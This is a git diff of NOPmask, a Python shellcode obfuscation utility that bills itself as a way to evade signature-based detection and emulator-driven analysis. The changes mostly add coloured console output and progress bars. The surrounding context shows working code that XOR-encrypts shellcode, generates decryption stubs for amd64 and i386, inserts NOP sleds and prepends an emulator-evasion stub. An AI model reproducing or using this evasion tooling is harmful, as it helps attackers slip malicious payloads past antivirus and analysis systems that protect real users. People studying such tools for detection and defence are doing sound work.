@@ -1,5 +1,7 @@
-import argparse, base64, math
+import argparse, base64 , math
+from colorama import init, Fore, Back, Style
 from pwn import *
+from tqdm import tqdm
 
 # GLOBALS
 AMD64 = "amd64"
@@ -49,6 +51,18 @@ passed_validation:
 NOP_SLED = b'\x90' * NOP_SLED_LEN
 
 # FUNCTIONS
+init(autoreset=True) # reset after each print
+def colorText(text, fg=None, bg=None, style=None):
+    result = ''
+    if style:
+        result += style
+    if fg:
+        result += fg
+    if bg:
+        result += bg
+    result += text
+    return result
+
 def getKey(shellcode):
     return [shellcode[i] ^ 0x90 for i in range(len(shellcode))]
 
@@ -56,8 +70,9 @@ def getEncryptedShellcode(shellcode, key):
     return bytes([shellcode[i] ^ key[i] for i in range(len(shellcode))])
 
 def generateShellcode(shellcode, arch):
-    context.arch = arch
+    print(colorText("[INFO]", fg=Fore.BLUE), "Generating instructions...\n")
 
+    context.arch = arch
     key = getKey(shellcode)
     encryptedShellcode = getEncryptedShellcode(shellcode, key)
 
@@ -70,7 +85,7 @@ def generateShellcode(shellcode, arch):
         context.bits = 64
         decryptStub += AMD64_GET_RIP
         shellcodeStart = shellcodeOffset = shellcodeLen + NOP_SLED_LEN + AMD64_GET_RIP_LEN
-        for i in range(math.ceil(shellcodeLen/DWORD_LEN)):
+        for i in tqdm(range(math.ceil(shellcodeLen/DWORD_LEN))):
             k = int.from_bytes(key[:DWORD_LEN], byteorder="little")
             decryptStub += f"xor DWORD PTR [rax - {hex(shellcodeOffset)}], {hex(k)}\n"
             shellcodeOffset -= DWORD_LEN
@@ -81,7 +96,7 @@ def generateShellcode(shellcode, arch):
         context.bits = 32
         decryptStub += I386_GET_EIP
         shellcodeStart = shellcodeOffset = shellcodeLen + NOP_SLED_LEN + I386_GET_EIP_LEN
-        for i in range(math.ceil(shellcodeLen/DWORD_LEN)):
+        for i in tqdm(range(math.ceil(shellcodeLen/DWORD_LEN))):
             k = int.from_bytes(key[:DWORD_LEN], byteorder="little")
             decryptStub += f"xor DWORD PTR [eax - {hex(shellcodeOffset)}], {hex(k)}\n"
             shellcodeOffset -= DWORD_LEN
@@ -91,17 +106,18 @@ def generateShellcode(shellcode, arch):
     else:
         raise Exception(f"Invalid architecture (must be {AMD64} or {I386})")
 
+    print(colorText("\n[INFO]", fg=Fore.BLUE), "Compiling instructions...")
     newShellcode = asm(EMULATOR_EVASION_STUB) + asm(trampoline) + NOP_SLED + encryptedShellcode + NOP_SLED + asm(decryptStub) + asm(trampolineBack)
     return newShellcode
 
 # MAIN
 if __name__ == "__main__":
-    print(r"""
+    print(colorText(r"""
     ██████████████████████████████████████████████
     █▄─▀█▄─▄█─▄▄─█▄─▄▄─█▄─▀█▀─▄██▀▄─██─▄▄▄▄█▄─█─▄█
     ██─█▄▀─██─██─██─▄▄▄██─█▄█─███─▀─██▄▄▄▄─██─▄▀██
-    ▀▄▄▄▀▀▄▄▀▄▄▄▄▀▄▄▄▀▀▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀
-                  NOPmask — Version 1.0
+    ▀▄▄▄▀▀▄▄▀▄▄▄▄▀▄▄▄▀▀▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀""", fg=Fore.RED))
+    print(r"""                  NOPmask — Version 1.0
  Shellcode obfuscation utility to evade signature-based 
       detection and emulator-driven analysis.
 
@@ -147,6 +163,6 @@ if __name__ == "__main__":
         if args.format == BASE64:
             newShellcode = base64.b64encode(newShellcode)
         open(args.output,"wb").write(newShellcode)
-        print("[w00t]", f"Wrote encrypted shellcode with decryption stub to \"{args.output}\" ({newShellcodeLen} bytes)")
+        print(colorText("[w00t]", fg=Fore.GREEN), f"Wrote encrypted shellcode with decryption stub to \"{args.output}\" ({newShellcodeLen} bytes)")
     except Exception as e:
-        print("[ERROR]", e)
+        print(colorText("[ERROR]", fg=Fore.RED), e.strerror)
